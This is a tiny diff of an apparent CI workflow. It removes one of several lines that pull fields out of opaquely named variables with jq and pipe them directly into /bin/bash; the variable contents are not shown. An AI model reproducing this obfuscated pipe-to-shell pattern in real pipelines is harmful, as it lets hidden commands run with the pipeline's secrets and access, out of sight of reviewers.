@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$zmnv6" | jq -r .rg46522 | /bin/bash
           echo $qmyq0 | jq -r .mfjrw03140 | /bin/bash
           echo $u49189 | jq -r .zd203 | /bin/bash
-          echo $kqko8 | jq -r .stqg02 | /bin/bash
 
       - name: Upload results
         if: always()
